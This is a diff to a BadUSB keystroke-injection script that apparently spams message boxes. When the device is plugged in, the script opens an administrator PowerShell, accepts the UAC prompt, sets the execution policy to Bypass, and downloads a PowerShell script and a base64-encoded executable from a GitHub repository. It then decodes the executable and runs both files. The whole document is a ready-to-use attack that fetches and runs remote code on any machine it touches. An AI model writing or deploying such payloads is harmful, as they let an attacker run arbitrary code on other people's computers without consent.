@@ -1,12 +1,25 @@
-REM Open PowerShell
+REM Open PowerShell in administrator mode
 GUI r
 DELAY 500
-STRING powershell
+STRING powershell Start-Process PowerShell -Verb RunAs
 ENTER
 DELAY 1000
 
+REM Confirm the UAC prompt (might not be needed if UAC is disabled)
+ALT y
+DELAY 1000
 
-REM Download encoded executable
+REM Change the execution policy for this session to allow script execution
+STRING Set-ExecutionPolicy Bypass -Scope Process -Force
+ENTER
+DELAY 500
+
+REM Download the PowerShell termination script
+STRING $url='https://raw.githubusercontent.com/Chrislundh98/BadUSB/main/MsgBox-Spam/msgbox.ps1'; $out='KillMsgBoxOnCtrlCombo.ps1'; Invoke-WebRequest -Uri $url -OutFile $out
+ENTER
+DELAY 1000
+
+REM Download the encoded executable
 STRING $url='https://raw.githubusercontent.com/Chrislundh98/BadUSB/main/MsgBox-Spam/encoded-msgbox.txt'; $out='encoded-msgbox.txt'; Invoke-WebRequest -Uri $url -OutFile $out
 ENTER
 DELAY 1000
@@ -15,6 +28,11 @@ REM Decode the file and save as .exe
 STRING $data=Get-Content -Path encoded-msgbox.txt; $decoded=[System.Convert]::FromBase64String($data); [System.IO.File]::WriteAllBytes('msgbox.exe', $decoded)
 ENTER
 DELAY 1000
+
+REM Execute the PowerShell script to monitor for termination key combo
+STRING PowerShell -ExecutionPolicy Bypass -File .\KillMsgBoxOnCtrlCombo.ps1
+ENTER
+DELAY 500
 
 REM Execute the decoded .exe file
 STRING Start-Process -FilePath .\msgbox.exe
